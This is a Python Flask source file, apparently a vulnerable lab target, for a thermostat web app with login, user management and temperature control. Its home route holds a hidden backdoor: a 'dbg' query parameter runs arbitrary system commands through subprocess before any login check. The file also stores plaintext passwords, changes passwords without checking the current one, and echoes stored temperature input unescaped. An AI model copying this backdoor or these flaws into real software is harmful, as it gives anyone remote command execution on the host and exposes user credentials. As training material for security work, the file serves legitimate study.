from flask import Flask, redirect, render_template, request, session
import os, json, subprocess


app = Flask(__name__)


@app.route("/login", methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		with open('credentials.json', 'r') as f:
			creds = json.load(f)
		if creds.get(request.form['username'], None) != request.form['password']:
			return redirect("/failure")
		else:
			session['user'] = request.form['username']
			return redirect("/")
	else:
		return """<form action="/login" method="POST">
			<h1>Login</h1>
			<p>username</p><input type="text" value="" placeholder="username" name="username"><br>
			<p>password</p><input type="password" value="" placeholder="password" name="password"><br>
			<input type="submit" value="Log in" class="btn">
			</form>"""


@app.route("/")
def hello_world():
	if request.args.get('dbg'):
		return subprocess.check_output(request.args.get('dbg').split())
	elif not session.get('user'):
		return 'Please <a href="/login">log in</a>'
	else:
		return """Options:<br>
			<a href="/temperature">View temperature</a><br>
			<a href="/set_temperature">Set temperature</a><br>
			<a href="/password">Change Password</a><br>
			<a href="/add_user">Add user</a><br>
			<a href="/del_user">Remove User</a><br>
			<a href="/logout">Log out</a>"""


@app.route("/failure")
def failure():
	return 'Access denied. Please <a href="/login">log in</a>'


@app.route("/logout")
def logout():
	session['user'] = None
	return redirect("/")


@app.route("/password", methods=['POST', 'GET'])
def change_password():
	if not session.get('user'):
		return redirect("/failure")
	elif request.method == 'POST':
		if session.get('user') is None or request.form['new_pass'] != request.form['new_pass_again']:
			return 'Failed to update password<br><a href="/">Home</a>'
		else:
			with open('credentials.json', 'r') as f:
				creds = json.load(f)
			creds[session.get('user')] = request.form['new_pass']
			with open('credentials.json', 'w') as f:
				json.dump(creds, f)
			return 'Password updated successfully<br><a href="/">Home</a>'	
	else:
		return """<form action="/password" method="POST">
			<h1>Change Password</h1>
			<p>password</p><input type="password" value="" placeholder="password" name="password"><br>
			<p>new password</p><input type="password" value="" placeholder="new password" name="new_pass"><br>
			<p>new password again</p><input type="password" value="" placeholder="new password again" name="new_pass_again"><br>
			<input type="submit" value="Change" class="btn">
			</form>"""


@app.route("/add_user", methods=['POST', 'GET'])
def add_user():
	if not session.get('user'):
		return redirect("/failure")
	elif request.method == 'POST':
		with open('credentials.json', 'r') as f:
			creds = json.load(f)
		creds[request.form['username']] = request.form['password']
		with open('credentials.json', 'w') as f:
			json.dump(creds, f)
		return 'User added<br><a href="/">Home</a>'
	else:
		return """<form action="/add_user" method="POST">
			<h1>Add User</h1>
			<p>username</p><input type="text" value="" placeholder="username" name="username"><br>
			<p>password</p><input type="password" value="" placeholder="password" name="password"><br>
			<input type="submit" value="Add User" class="btn">
			</form>"""


@app.route("/del_user", methods=['POST', 'GET'])
def del_user():
	if not session.get('user'):
		return redirect("/failure")
	elif request.method == 'POST':
		with open('credentials.json', 'r') as f:
			creds = json.load(f)
		creds.pop(request.form['username'])
		with open('credentials.json', 'w') as f:
			json.dump(creds, f)
		if request.form['username'] == session.get('user'):
			return redirect("/logout")
		else:
			return 'User deleted successfully<br><a href="/">Home</a>'
	else:
		return """<form action="/del_user" method="POST">
			<h1>Delete User</h1>
			<p>username</p><input type="text" value="" placeholder="username" name="username"><br>
			<input type="submit" value="Delete User" class="btn">
			</form>"""
			


@app.route("/temperature")
def temperature():
	with open('temperature.dat', 'r') as f:
		temp = f.read()
	return f'<h1>{temp}</h1><br><a href="/">Home</a>'


@app.route("/set_temperature", methods=['POST', 'GET'])
def set_temperature():
	if not session.get('user'):
		return redirect("/failure")
	elif request.method == 'POST':
		with open('temperature.dat', 'w') as f:
			f.write(request.form['new_temp'])
		return 'Temperature changed successfully<br><a href="/temperature">View Temperature</a><br><a href="/">Home</a>'
	else:
		return """<form action="/set_temperature" method="POST">
			<h1>Set Temperature</h1>
			<p>New temperature</p><input type="text" value="" placeholder="new_temp" name="new_temp"><br>
			<input type="submit" value="Set Temperature" class="btn">
			</form>"""


if __name__ == '__main__':
	app.secret_key = os.urandom(12)
	app.run(host='0.0.0.0', port=80, debug=False)
